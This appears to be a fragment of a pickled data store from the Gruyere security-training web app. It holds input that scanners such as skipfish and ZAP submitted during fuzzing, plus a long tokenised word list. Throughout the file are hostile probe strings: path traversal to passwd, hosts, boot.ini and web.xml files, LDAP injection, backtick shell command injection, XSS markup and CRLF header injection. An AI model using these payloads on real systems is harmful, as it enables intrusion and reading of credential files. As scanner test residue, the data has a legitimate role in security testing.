ssS'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini\x00bRxNsIAu'
p1623
(dp1624
g4
S'True'
p1625
sg6
g1623
sg7
S'g8S!c8l!X0'
p1626
ssS'zbVCLPfF'
p1627
(dp1628
g10
S'True'
p1629
sg12
g1627
sg13
S'u]H[ww6KrA9F.x-F'
p1630
ssS'\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xaf\xc0\xae\xc0\xae\xc0\xafetc\xc0\xafpasswd'
p1631
(dp1632
g4
S'True'
p1633
sg6
g1631
sg7
S'g8S!c8l!X0'
p1634
ssS'*)(!(objectClass=*)'
p1635
(dp1636
g4
S'True'
p1637
sg6
g1635
sg7
S'g8S!c8l!X0'
p1638
ssS'vjYTjpqN|echo vgkrtuua61 cyf76vn59d||a #\' |echo vgkrtuua61 cyf76vn59d||a #|" |echo vgkrtuua61 cyf76vn59d||a #'
p1639
(dp1640
g4
S'True'
p1641
sg6
g1639
sg7
S'g8S!c8l!X0'
p1642
ssS'c:/Windows/system.ini'
p1643
(dp1644
g10
S'True'
p1645
sg12
g1643
sg13
NssS'file:///c:/windows/win.ini'
p1646
(dp1647
g4
S'True'
p1648
sg6
g1646
sg7
S'g8S!c8l!X0'
p1649
ssS'skipfish://invalid/;?'
p1650
(dp1651
g4
S'True'
p1652
sg6
g1650
sg7
S'1'
ssS'vjYTjpqN]]>><'
p1653
(dp1654
g4
S'True'
p1655
sg6
g1653
sg7
S'g8S!c8l!X0'
p1656
ssS'vxduya9ym3)(objectClass=*'
p1657
(dp1658
g4
S'True'
p1659
sg6
g1657
sg7
S'g8S!c8l!X0'
p1660
ssS"1'`false`'"
p1661
(dp1662
g4
S'True'
p1663
sg6
g1661
sg7
S'1'
ssS'../../../../../../../../../../../../../../windows/win.ini'
p1664
(dp1665
g10
S'True'
p1666
sg12
g1664
sg13
S'u]H[ww6KrA9F.x-F'
p1667
ssS'1`true`'
p1668
(dp1669
S'private_snippet'
p1670
S'1'
sg6
S'1`true`'
p1671
sS'icon'
p1672
S'1'
sS'web_site'
p1673
S'http://example.com/?sfish_form_test'
p1674
sS'color'
p1675
S'30pt'
p1676
sg4
S'True'
p1677
sS'snippets'
p1678
(lp1679
S'61'
p1680
aS'61'
p1681
aS'weight'
p1682
aS'weight'
p1683
aS'action'
p1684
aS'action'
p1685
aS'o'
aS'o'
aS'99'
p1686
aS'99'
p1687
aS'login'
p1688
aS'login'
p1689
aS'upload2'
p1690
aS'upload2'
p1691
aS'xyz'
p1692
aS'xyz'
p1693
aS'Login'
p1694
aS'Login'
p1695
aS'ZAP'
p1696
aS'ZAP'
p1697
aS'saveprofile'
p1698
aS'saveprofile'
p1699
aS'update'
p1700
aS'update'
p1701
aS'js'
p1702
aS'js'
p1703
aS'newsnippet'
p1704
aS'newsnippet'
p1705
aS'feed'
p1706
aS'feed'
p1707
aS'logout'
p1708
aS'logout'
p1709
aS'newsnippet2'
p1710
aS'newsnippet2'
p1711
aS'is_author'
p1712
aS'is_author'
p1713
aS'upload'
p1714
aS'upload'
p1715
aS'oldpw'
p1716
aS'oldpw'
p1717
aS'icon'
p1718
aS'icon'
p1719
aS'192'
p1720
aS'192'
p1721
aS'uid'
p1722
aS'uid'
p1723
aS'x'
aS'x'
aS'lib'
p1724
aS'lib'
p1725
aS'alesander'
p1726
aS'alesander'
p1727
aS'editprofile'
p1728
aS'editprofile'
p1729
aS'gtl'
p1730
aS'gtl'
p1731
aS'brie'
p1732
aS'brie'
p1733
aS'web_site'
p1734
aS'web_site'
p1735
aS'private_snippet'
p1736
aS'private_snippet'
p1737
aS'newaccount'
p1738
aS'newaccount'
p1739
aS'snippet'
p1740
aS'snippet'
p1741
aS'Home'
p1742
aS'Home'
p1743
aS'snippets'
p1744
aS'snippets'
p1745
aS'168'
p1746
aS'168'
p1747
aS'cheddar'
p1748
aS'cheddar'
p1749
aS'77'
p1750
aS'77'
p1751
aS'color'
p1752
aS'color'
p1753
aS'pw'
p1754
aS'pw'
p1755
aS'name'
p1756
aS'name'
p1757
aS'True'
p1758
aS'True'
p1759
aS'new'
p1760
aS'new'
p1761
aS'91'
p1762
aS'91'
p1763
aS'3'
aS'3'
aS'size'
p1764
aS'size'
p1765
aS'a'
aS'a'
aS'vertical'
p1766
aS'vertical'
p1767
aS'79'
p1768
aS'79'
p1769
aS'84'
p1770
aS'84'
p1771
aS'div'
p1772
aS'div'
p1773
aS'100000000'
p1774
aS'100000000'
p1775
aS'107'
p1776
aS'107'
p1777
aS'type'
p1778
aS'type'
p1779
aS'window'
p1780
aS'window'
p1781
aS'Inc'
p1782
aS'Inc'
p1783
aS'98991'
p1784
aS'98991'
p1785
aS'14pt'
p1786
aS'14pt'
p1787
aS'edvsxsnyh5n7ht41s9221evsxj3crgf7hv8iy6n'
p1788
aS'edvsxsnyh5n7ht41s9221evsxj3crgf7hv8iy6n'
p1789
aS'35px'
p1790
aS'35px'
p1791
aS'bxfx'
p1792
aS'bxfx'
p1793
aS'2017'
p1794
aS'2017'
p1795
aS'Pragma'
p1796
aS'Pragma'
p1797
aS'hosts'
p1798
aS'hosts'
p1799
aS'124'
p1800
aS'124'
p1801
aS'Date'
p1802
aS'Date'
p1803
aS'background'
p1804
aS'background'
p1805
aS'where'
p1806
aS'where'
p1807
aS'right'
p1808
aS'right'
p1809
aS'load'
p1810
aS'load'
p1811
aS'Location'
p1812
aS'Location'
p1813
aS'l'
aS'l'
aS'42'
p1814
aS'42'
p1815
aS'declare'
p1816
aS'declare'
p1817
aS'INADDR'
p1818
aS'INADDR'
p1819
aS'waitfor'
p1820
aS'waitfor'
p1821
aS'1000000'
p1822
aS'1000000'
p1823
aS'41'
p1824
aS'41'
p1825
aS'cache'
p1826
aS'cache'
p1827
aS'Transitional'
p1828
aS'Transitional'
p1829
aS'HTTP'
p1830
aS'HTTP'
p1831
aS'36'
p1832
aS'36'
p1833
aS'XSS'
p1834
aS'XSS'
p1835
aS'Gruyere'
p1836
aS'Gruyere'
p1837
aS'115'
p1838
aS'115'
p1839
aS'td'
p1840
aS'td'
p1841
aS'Python'
p1842
aS'Python'
p1843
aS'font'
p1844
aS'font'
p1845
aS'top'
p1846
aS'top'
p1847
aS'317940'
p1848
aS'317940'
p1849
aS'when'
p1850
aS'when'
p1851
aS'80'
p1852
aS'80'
p1853
aS'title'
p1854
aS'title'
p1855
aS'95'
p1856
aS'95'
p1857
aS'ffffff'
p1858
aS'ffffff'
p1859
aS'nbsp'
p1860
aS'nbsp'
p1861
aS'Snippet'
p1862
aS'Snippet'
p1863
aS'auto'
p1864
aS'auto'
p1865
aS'sleep'
p1866
aS'sleep'
p1867
aS'COLUMNS'
p1868
aS'COLUMNS'
p1869
aS'root'
p1870
aS'root'
p1871
aS'103'
p1872
aS'103'
p1873
aS'5px'
p1874
aS'5px'
p1875
aS'head'
p1876
aS'head'
p1877
aS'1em'
p1878
aS'1em'
p1879
aS'zApPX3sS'
p1880
aS'zApPX3sS'
p1881
aS'refresh'
p1882
aS'refresh'
p1883
aS'OK'
p1884
aS'OK'
p1885
aS'BaseHTTP'
p1886
aS'BaseHTTP'
p1887
aS'family'
p1888
aS'family'
p1889
aS'30pt'
p1890
aS'30pt'
p1891
aS'th'
p1892
aS'th'
p1893
aS'9'
aS'9'
aS'50'
p1894
aS'50'
p1895
aS'ffb149'
p1896
aS'ffb149'
p1897
aS'png'
p1898
aS'png'
p1899
aS'89049316436442'
p1900
aS'89049316436442'
p1901
aS'SYSTEM'
p1902
aS'SYSTEM'
p1903
aS'randomblob'
p1904
aS'randomblob'
p1905
aS'exists'
p1906
aS'exists'
p1907
aS'UNION'
p1908
aS'UNION'
p1909
aS'81'
p1910
aS'81'
p1911
aS'100000'
p1912
aS'100000'
p1913
aS'left'
p1914
aS'left'
p1915
aS'10000000'
p1916
aS'10000000'
p1917
aS'ffffcc'
p1918
aS'ffffcc'
p1919
aS'Google'
p1920
aS'Google'
p1921
aS'underline'
p1922
aS'underline'
p1923
aS'Protection'
p1924
aS'Protection'
p1925
aS'bb0000'
p1926
aS'bb0000'
p1927
aS'104'
p1928
aS'104'
p1929
aS'Sign'
p1930
aS'Sign'
p1931
aS'user'
p1932
aS'user'
p1933
aS'69'
p1934
aS'69'
p1935
aS'dfbxca'
p1936
aS'dfbxca'
p1937
aS'01'
p1938
aS'01'
p1939
aS'not'
p1940
aS'not'
p1941
aS'121'
p1942
aS'121'
p1943
aS'bottom'
p1944
aS'bottom'
p1945
aS'textarea'
p1946
aS'textarea'
p1947
aS'radius'
p1948
aS'radius'
p1949
aS'cometo'
p1950
aS'cometo'
p1951
aS'table'
p1952
aS'table'
p1953
aS'HTML'
p1954
aS'HTML'
p1955
aS'94'
p1956
aS'94'
p1957
aS'97996'
p1958
aS'97996'
p1959
aS'60'
p1960
aS'60'
p1961
aS'UTL'
p1962
aS'UTL'
p1963
aS'All'
p1964
aS'All'
p1965
aS'varchar'
p1966
aS'varchar'
p1967
aS'37'
p1968
aS'37'
p1969
aS'2'
aS'2'
aS'20'
p1970
aS'20'
p1971
aS'05'
p1972
aS'05'
p1973
aS'is'
p1974
aS'is'
p1975
aS'xca'
p1976
aS'xca'
p1977
aS'null'
p1978
aS'null'
p1979
aS'button'
p1980
aS'button'
p1981
aS'DOCTYPE'
p1982
aS'DOCTYPE'
p1983
aS'write'
p1984
aS'write'
p1985
aS'message'
p1986
aS'message'
p1987
aS'width'
p1988
aS'width'
p1989
aS'2023'
p1990
aS'2023'
p1991
aS'PUBLIC'
p1992
aS'PUBLIC'
p1993
aS'pg'
p1994
aS'pg'
p1995
aS'lang'
p1996
aS'lang'
p1997
aS'to'
p1998
aS'to'
p1999
aS'tr'
p2000
aS'tr'
p2001
aS'file'
p2002
aS'file'
p2003
aS'dot'
p2004
aS'dot'
p2005
aS'end'
p2006
aS'end'
p2007
aS'input'
p2008
aS'input'
p2009
aS'1331'
p2010
aS'1331'
p2011
aS'21'
p2012
aS'21'
p2013
aS'content'
p2014
aS'content'
p2015
aS'opacity'
p2016
aS'opacity'
p2017
aS'0000bb'
p2018
aS'0000bb'
p2019
aS'script'
p2020
aS'script'
p2021
aS'h3'
p2022
aS'h3'
p2023
aS'X'
aS'X'
aS'30'
p2024
aS'30'
p2025
aS'Profile'
p2026
aS'Profile'
p2027
aS'your'
p2028
aS'your'
p2029
aS'border'
p2030
aS'border'
p2031
aS'19'
p2032
aS'19'
p2033
aS'menu'
p2034
aS'menu'
p2035
aS'26'
p2036
aS'26'
p2037
aS'no'
p2038
aS'no'
p2039
aS'moz'
p2040
aS'moz'
p2041
aS'10px'
p2042
aS'10px'
p2043
aS'Feb'
p2044
aS'Feb'
p2045
aS'account'
p2046
aS'account'
p2047
aS'825550'
p2048
aS'825550'
p2049
aS'20px'
p2050
aS'20px'
p2051
aS'15000'
p2052
aS'15000'
p2053
aS'100'
p2054
aS'100'
p2055
aS'58'
p2056
aS'58'
p2057
aS'here'
p2058
aS'here'
p2059
aS'cheese'
p2060
aS'cheese'
p2061
aS'style'
p2062
aS'style'
p2063
aS'ffdddd'
p2064
aS'ffdddd'
p2065
aS'hover'
p2066
aS'hover'
p2067
aS'repeat'
p2068
aS'repeat'
p2069
aS'76'
p2070
aS'76'
p2071
aS'5'
aS'5'
aS'padding'
p2072
aS'padding'
p2073
aS'elements'
p2074
aS'elements'
p2075
aS'Copyright'
p2076
aS'Copyright'
p2077
aS'1000000000'
p2078
aS'1000000000'
p2079
aS'DTD'
p2080
aS'DTD'
p2081
aS'Select'
p2082
aS'Select'
p2083
aS'29'
p2084
aS'29'
p2085
aS'Thread'
p2086
aS'Thread'
p2087
aS'56'
p2088
aS'56'
p2089
aS'131'
p2090
aS'131'
p2091
aS'119'
p2092
aS'119'
p2093
aS'0OcD'
p2094
aS'0OcD'
p2095
aS'GMT'
p2096
aS'GMT'
p2097
aS'129'
p2098
aS'129'
p2099
aS'90'
p2100
aS'90'
p2101
aS'out'
p2102
aS'out'
p2103
aS'body'
p2104
aS'body'
p2105
aS'text'
p2106
aS'text'
p2107
aS'Upload'
p2108
aS'Upload'
p2109
aS'dbo'
p2110
aS'dbo'
p2111
aS'bold'
p2112
aS'bold'
p2113
aS'59'
p2114
aS'59'
p2115
aS'9264'
p2116
aS'9264'
p2117
aS'New'
p2118
aS'New'
p2119
aS'html'
p2120
aS'html'
p2121
aS'105'
p2122
aS'105'
p2123
aS'08759'
p2124
aS'08759'
p2125
aS'vvdwxuaw9ap3z0k6v1rssy6sqtvwhyu3zhp6vgas4e2n6ms8vlxu7ijgi7'
p2126
aS'vvdwxuaw9ap3z0k6v1rssy6sqtvwhyu3zhp6vgas4e2n6ms8vlxu7ijgi7'
p2127
aS'W3C'
p2128
aS'W3C'
p2129
aS'visited'
p2130
aS'visited'
p2131
aS'75'
p2132
aS'75'
p2133
aS'000000'
p2134
aS'000000'
p2135
aS'7'
aS'7'
aS'Snippets'
p2136
aS'Snippets'
p2137
aS'9101'
p2138
aS'9101'
p2139
aS'2pt'
p2140
aS'2pt'
p2141
aS'align'
p2142
aS'align'
p2143
aS'dirtree'
p2144
aS'dirtree'
p2145
aS'solid'
p2146
aS'solid'
p2147
aS'4'
aS'4'
aS'decoration'
p2148
aS'decoration'
p2149
aS'NULL'
p2150
aS'NULL'
p2151
aS'47'
p2152
aS'47'
p2153
aS'27'
p2154
aS'27'
p2155
aS'3px'
p2156
aS'3px'
p2157
aS'651631'
p2158
aS'651631'
p2159
aS'200'
p2160
aS'200'
p2161
aS'EN'
p2162
aS'EN'
p2163
aS'32'
p2164
aS'32'
p2165
aS'Brie'
p2166
aS'Brie'
p2167
aS'106'
p2168
aS'106'
p2169
aS'margin'
p2170
aS'margin'
p2171
aS'87'
p2172
aS'87'
p2173
aS'form'
p2174
aS'form'
p2175
aS'43'
p2176
aS'43'
p2177
aS'sans'
p2178
aS'sans'
p2179
aS'35'
p2180
aS'35'
p2181
aS'0'
aS'0'
aS'Content'
p2182
aS'Content'
p2183
aS'from'
p2184
aS'from'
p2185
aS'serif'
p2186
aS'serif'
p2187
aS'My'
p2188
aS'My'
p2189
aS'the'
p2190
aS'the'
p2191
aS'33'
p2192
aS'33'
p2193
aS'53'
p2194
aS'53'
p2195
aS'66'
p2196
aS'66'
p2197
aS'661468'
p2198
aS'661468'
p2199
aS'77758981448108'
p2200
aS'77758981448108'
p2201
aS'31'
p2202
aS'31'
p2203
aS'WUKU78'
p2204
aS'WUKU78'
p2205
aS'center'
p2206
aS'center'
p2207
aS'AND'
p2208
aS'AND'
p2209
aS'12'
p2210
aS'12'
p2211
aS'span'
p2212
aS'span'
p2213
aS'22933893920073'
p2214
aS'22933893920073'
p2215
aS'url'
p2216
aS'url'
p2217
aS'in'
p2218
aS'in'
p2219
aS'select'
p2220
aS'select'
p2221
aS'93'
p2222
aS'93'
p2223
aS'ff0000'
p2224
aS'ff0000'
p2225
aS'Server'
p2226
aS'Server'
p2227
aS'2px'
p2228
aS'2px'
p2229
aS'float'
p2230
aS'float'
p2231
aS'18'
p2232
aS'18'
p2233
aS'h2'
p2234
aS'h2'
p2235
aS'cast'
p2236
aS'cast'
p2237
aS'0'
aS'0'
aS'9'
aS'9'
aS'2'
aS'2'
aS'3'
aS'3'
aS'4'
aS'4'
aS'5'
aS'5'
aS'6'
aS'6'
aS'7'
aS'7'
aS'8'
aS'8'
aS'10'
p2238
aS'10'
p2239
aS'11'
p2240
aS'11'
p2241
aS'12'
p2242
aS'12'
p2243
aS'13'
p2244
aS'13'
p2245
aS'14'
p2246
aS'14'
p2247
aS'15'
p2248
aS'15'
p2249
aS'16'
p2250
aS'16'
p2251
aS'17'
p2252
aS'17'
p2253
aS'18'
p2254
aS'18'
p2255
aS'19'
p2256
aS'19'
p2257
aS'20'
p2258
aS'20'
p2259
aS'21'
p2260
aS'21'
p2261
aS'22'
p2262
aS'22'
p2263
aS'23'
p2264
aS'23'
p2265
aS'24'
p2266
aS'24'
p2267
aS'25'
p2268
aS'25'
p2269
aS'26'
p2270
aS'26'
p2271
aS'27'
p2272
aS'27'
p2273
aS'28'
p2274
aS'28'
p2275
aS'29'
p2276
aS'29'
p2277
aS'30'
p2278
aS'30'
p2279
aS'31'
p2280
aS'31'
p2281
aS'32'
p2282
aS'32'
p2283
aS'33'
p2284
aS'33'
p2285
aS'34'
p2286
aS'34'
p2287
aS'35'
p2288
aS'35'
p2289
aS'36'
p2290
aS'36'
p2291
aS'37'
p2292
aS'37'
p2293
aS'38'
p2294
aS'38'
p2295
aS'39'
p2296
aS'39'
p2297
aS'40'
p2298
aS'40'
p2299
aS'41'
p2300
aS'41'
p2301
aS'42'
p2302
aS'42'
p2303
aS'43'
p2304
aS'43'
p2305
aS'44'
p2306
aS'44'
p2307
aS'45'
p2308
aS'45'
p2309
aS'46'
p2310
aS'46'
p2311
aS'47'
p2312
aS'47'
p2313
aS'48'
p2314
aS'48'
p2315
aS'49'
p2316
aS'49'
p2317
aS'50'
p2318
aS'50'
p2319
aS'51'
p2320
aS'51'
p2321
aS'52'
p2322
aS'52'
p2323
aS'53'
p2324
aS'53'
p2325
aS'54'
p2326
aS'54'
p2327
aS'55'
p2328
aS'55'
p2329
aS'56'
p2330
aS'56'
p2331
aS'57'
p2332
aS'57'
p2333
aS'58'
p2334
aS'58'
p2335
aS'59'
p2336
aS'59'
p2337
aS'60'
p2338
aS'60'
p2339
aS'61'
p2340
aS'61'
p2341
aS'62'
p2342
aS'62'
p2343
aS'63'
p2344
aS'63'
p2345
aS'64'
p2346
aS'64'
p2347
aS'65'
p2348
aS'65'
p2349
aS'66'
p2350
aS'66'
p2351
aS'67'
p2352
aS'67'
p2353
aS'68'
p2354
aS'68'
p2355
aS'69'
p2356
aS'69'
p2357
aS'70'
p2358
aS'70'
p2359
aS'72'
p2360
aS'72'
p2361
aS'73'
p2362
aS'73'
p2363
aS'74'
p2364
aS'74'
p2365
aS'75'
p2366
aS'75'
p2367
aS'76'
p2368
aS'76'
p2369
aS'77'
p2370
aS'77'
p2371
aS'78'
p2372
aS'78'
p2373
aS'79'
p2374
aS'79'
p2375
aS'80'
p2376
aS'80'
p2377
aS'81'
p2378
aS'81'
p2379
aS'82'
p2380
aS'82'
p2381
aS'83'
p2382
aS'83'
p2383
aS'84'
p2384
aS'84'
p2385
aS'85'
p2386
aS'85'
p2387
aS'86'
p2388
aS'86'
p2389
aS'87'
p2390
aS'87'
p2391
aS'88'
p2392
aS'88'
p2393
aS'89'
p2394
aS'89'
p2395
aS'90'
p2396
aS'90'
p2397
aS'91'
p2398
aS'91'
p2399
aS'92'
p2400
aS'92'
p2401
aS'93'
p2402
aS'93'
p2403
aS'94'
p2404
aS'94'
p2405
aS'95'
p2406
aS'95'
p2407
aS'96'
p2408
aS'96'
p2409
aS'97'
p2410
aS'97'
p2411
aS'98'
p2412
aS'98'
p2413
aS'99'
p2414
aS'99'
p2415
aS'100'
p2416
aS'100'
p2417
aS'101'
p2418
aS'101'
p2419
aS'1`echo${IFS}skip12``echo${IFS}34fish`'
p2420
aS'1`echo${IFS}skip12``echo${IFS}34fish`'
p2421
aS'`echo skip12``echo 34fish`'
p2422
aS'`echo skip12``echo 34fish`'
p2423
aS'1`echo skip12``echo 34fish`'
p2424
aS'1`echo skip12``echo 34fish`'
p2425
aS'`echo${IFS}skip12``echo${IFS}34fish`'
p2426
aS'`echo${IFS}skip12``echo${IFS}34fish`'
p2427
aS'1`sleep 4`'
p2428
aS'1`sleep 4`'
p2429
aS'`sleep 4`'
p2430
aS'`sleep 4`'
p2431
aS'1`sleep 6`'
p2432
aS'1`sleep 6`'
p2433
aS'`sleep 6`'
p2434
aS'`sleep 6`'
p2435
aS'1`sleep${IFS}4`'
p2436
aS'1`sleep${IFS}4`'
p2437
aS'`sleep${IFS}4`'
p2438
aS'`sleep${IFS}4`'
p2439
aS'1`sleep${IFS}6`'
p2440
aS'1`sleep${IFS}6`'
p2441
aS'`sleep${IFS}6`'
p2442
aS'`sleep${IFS}6`'
p2443
aS'1`false`'
p2444
aS'1`false`'
p2445
aS"1'`false`'"
p2446
aS"1'`false`'"
p2447
aS'1`true`'
p2448
aS'1`true`'
p2449
aS'1`uname`'
p2450
aS'1`uname`'
p2451
aS'1"`true`"'
p2452
aS'1"`true`"'
p2453
aS'1"`false`"'
p2454
aS'1"`false`"'
p2455
aS'1"`uname`"'
p2456
aS'1"`uname`"'
p2457
aS"1'`true`'"
p2458
aS"1'`true`'"
p2459
aS"1'`uname`'"
p2460
aS"1'`uname`'"
p2461
aS'`true`'
p2462
aS'`true`'
p2463
aS'`false`'
p2464
aS'`false`'
p2465
aS'`uname`'
p2466
aS'`uname`'
p2467
aS'sfish>\'>"><sfish></sfish>'
p2468
aS'sfish>\'>"><sfish></sfish>'
p2469
aS'sfish>\'>"></sfish><sfish>'
p2470
aS'sfish>\'>"></sfish><sfish>'
p2471
aS'1-0'
p2472
aS'1-0'
p2473
aS'1-0-0'
p2474
aS'1-0-0'
p2475
aS'1-0-9'
p2476
aS'1-0-9'
p2477
aS'1\\\'\\"'
p2478
aS'1\\\'\\"'
p2479
aS'1\'"'
p2480
aS'1\'"'
p2481
aS'1\\\\\'\\\\"'
p2482
aS'1\\\\\'\\\\"'
p2483
aS'1 - 0 - 0'
p2484
aS'1 - 0 - 0'
p2485
aS'1 0 0 - -'
p2486
aS'1 0 0 - -'
p2487
aS'1\'\'\'\'""""'
p2488
aS'1\'\'\'\'""""'
p2489
aS'1\'"\'"\'"\'"'
p2490
aS'1\'"\'"\'"\'"'
p2491
aS'http://skipfish.invalid/;?'
p2492
aS'http://skipfish.invalid/;?'
p2493
aS'//skipfish.invalid/;?'
p2494
aS'//skipfish.invalid/;?'
p2495
aS'skipfish://invalid/;?'
p2496
aS'skipfish://invalid/;?'
p2497
aS'\'skip\'\'\'"fish"""'
p2498
aS'\'skip\'\'\'"fish"""'
p2499
aS'&apos;skip&apos;&apos;&apos;&quot;fish&quot;&quot;&quot;'
p2500
aS'&apos;skip&apos;&apos;&apos;&quot;fish&quot;&quot;&quot;'
p2501
aS'1bogus\nSkipfish-Inject:bogus'
p2502
aS'1bogus\nSkipfish-Inject:bogus'
p2503
aS'1bogus\rSkipfish-Inject:bogus'
p2504
aS'1bogus\rSkipfish-Inject:bogus'
p2505
aS'+/skipfish-bom'
p2506
aS'+/skipfish-bom'
p2507
aS'1-->">\'>\'"<sfi000106v187080>'
p2508
aS'1-->">\'>\'"<sfi000106v187080>'
p2509
aS'.htaccess.aspx-->">\'>\'"<sfi000107v187080>'
p2510
aS'.htaccess.aspx-->">\'>\'"<sfi000107v187080>'
p2511
aS'1'
aS'1'
aS'1'
aS'1'
aS'http://www.google.com/humans.txt#foo='
p2512
aS'http://www.google.com/humans.txt#foo='
p2513
aS'file:///etc/passwd\x00.js'
p2514
aS'file:///etc/passwd\x00.js'
p2515
aS'file:%2F%2F%2Fboot.ini'
p2516
aS'file:%2F%2F%2Fboot.ini'
p2517
aS'/../../../../../../../../../etc/hosts'
p2518
aS'/../../../../../../../../../etc/hosts'
p2519
aS'/../../../../../../../../../etc/hosts'
p2520
aS'/../../../../../../../../../etc/hosts'
p2521
aS'%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts'
p2522
aS'%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts'
p2523
aS'/../../../../../../../../../etc/hosts\x00.js'
p2524
aS'/../../../../../../../../../etc/hosts\x00.js'
p2525
aS'file:///etc/hosts'
p2526
aS'file:///etc/hosts'
p2527
aS'file:///etc/hosts'
p2528
aS'file:///etc/hosts'
p2529
aS'file:%2F%2F%2Fetc%2Fhosts'
p2530
aS'file:%2F%2F%2Fetc%2Fhosts'
p2531
aS'file:///etc/hosts\x00.js'
p2532
aS'file:///etc/hosts\x00.js'
p2533
aS'/../../../../../../../../../etc/passwd'
p2534
aS'/../../../../../../../../../etc/passwd'
p2535
aS'/../../../../../../../../../etc/passwd'
p2536
aS'/../../../../../../../../../etc/passwd'
p2537
aS'%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
p2538
aS'%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
p2539
aS'/../../../../../../../../../etc/passwd\x00.js'
p2540
aS'/../../../../../../../../../etc/passwd\x00.js'
p2541
aS'file:///etc/passwd'
p2542
aS'file:///etc/passwd'
p2543
aS'file:///etc/passwd'
p2544
aS'file:///etc/passwd'
p2545
aS'file:%2F%2F%2Fetc%2Fpasswd'
p2546
aS'file:%2F%2F%2Fetc%2Fpasswd'
p2547
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini'
p2548
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini'
p2549
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini'
p2550
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini'
p2551
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini'
p2552
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini'
p2553
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini\x00.js'
p2554
aS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini\x00.js'
p2555
aS'file:///boot.ini'
p2556
aS'file:///boot.ini'
p2557
aS'file:///boot.ini'
p2558
aS'file:///boot.ini'
p2559
aS'file:///boot.ini\x00.js'
p2560
aS'file:///boot.ini\x00.js'
p2561
aS'/../WEB-INF/web.xml'
p2562
aS'/../WEB-INF/web.xml'
p2563
aS'/../WEB-INF/web.xml'
p2564
aS'/../WEB-INF/web.xml'
p2565
aS'/../WEB-INF/web.xml\x00.js'
p2566
aS'/../WEB-INF/web.xml\x00.js'
p2567
aS'/../../WEB-INF/web.xml'
p2568
aS'/../../WEB-INF/web.xml'
p2569
aS'/../../WEB-INF/web.xml'
p2570
aS'/../../WEB-INF/web.xml'
p2571
aS'/../../WEB-INF/web.xml\x00.js'
p2572
aS'/../../WEB-INF/web.xml\x00.js'
p2573
aS'/../../../WEB-INF/web.xml'
p2574
aS'/../../../WEB-INF/web.xml'
p2575
aS'/../../../WEB-INF/web.xml'
p2576
aS'/../../../WEB-INF/web.xml'
p2577
aS'/../../../WEB-INF/web.xml\x00.js'
p2578
aS'/../../../WEB-INF/web.xml\x00.js'
p2579
aS'/../../../../WEB-INF/web.xml'
p2580
aS'/../../../../WEB-INF/web.xml'
p2581
aS'/../../../../WEB-INF/web.xml'
p2582
aS'/../../../../WEB-INF/web.xml'
p2583
aS'/../../../../WEB-INF/web.xml\x00.js'
p2584
aS'/../../../../WEB-INF/web.xml\x00.js'
p2585
aS'/../../../../../WEB-INF/web.xml'
p2586
aS'/../../../../../WEB-INF/web.xml'
p2587
aS'/../../../../../WEB-INF/web.xml'
p2588
aS'/../../../../../WEB-INF/web.xml'
p2589
aS'/../../../../../WEB-INF/web.xml\x00.js'
p2590
aS'/../../../../../WEB-INF/web.xml\x00.js'
p2591
aS'/../../../../../../WEB-INF/web.xml'
p2592
aS'/../../../../../../WEB-INF/web.xml'
p2593
aS'/../../../../../../WEB-INF/web.xml'
p2594
aS'/../../../../../../WEB-INF/web.xml'
p2595
aS'/../../../../../../WEB-INF/web.xml\x00.js'
p2596
aS'/../../../../../../WEB-INF/web.xml\x00.js'
p2597
aS'/../../../../../../../WEB-INF/web.xml'
p2598
aS'/../../../../../../../WEB-INF/web.xml'
p2599
aS'/../../../../../../../WEB-INF/web.xml'
p2600
aS'/../../../../../../../WEB-INF/web.xml'
p2601
aS'/../../../../../../../WEB-INF/web.xml\x00.js'
p2602
aS'/../../../../../../../WEB-INF/web.xml\x00.js'
p2603
aS'/../../../../../../../../WEB-INF/web.xml'
p2604
aS'/../../../../../../../../WEB-INF/web.xml'
p2605
aS'/../../../../../../../../WEB-INF/web.xml'
p2606
aS'/../../../../../../../../WEB-INF/web.xml'
p2607
aS'/../../../../../../../../WEB-INF/web.xml\x00.js'
p2608
aS'/../../../../../../../../WEB-INF/web.xml\x00.js'
p2609
aS'.../1'
p2610
aS'.../1'
p2611
aS'./1'
p2612
aS'./1'
p2613
aS'...\\1'
p2614
aS'...\\1'
p2615
aS'.\\1'
p2616
aS'.\\1'
p2617
aS'9876sfi'
p2618
aS'9876sfi'
p2619
aS'9876sfi'
p2620
aS'9876sfi'
p2621
aS'9876sfi'
p2622
aS'9876sfi'
p2623
aS'9876sfi'
p2624
aS'9876sfi'
p2625
aS'9876sfi'
p2626
aS'9876sfi'
p2627
aS'9876sfi'
p2628
aS'9876sfi'
p2629
aS'9876sfi'
p2630
aS'9876sfi'
p2631
aS'9876sfi'
p2632
aS'9876sfi'
p2633
aS'9876sfi'
p2634
aS'9876sfi'
p2635
aS'9876sfi'
p2636
aS'9876sfi'
p2637
aS'9876sfi'
p2638
aS'9876sfi'
p2639
aS'9876sfi'
p2640
aS'9876sfi'
p2641
aS'9876sfi'
p2642
aS'9876sfi'
p2643
aS'9876sfi'
p2644
aS'9876sfi'
p2645
aS'9876sfi'
p2646
aS'9876sfi'
p2647
aS'1'
aS'1'
asg7
S'1'
ssS'0i1cz\r\nh9zie'
p2648
(dp2649
g4
S'True'
p2650
sg6
g2648
sg7
S'g8S!c8l!X0'
p2651
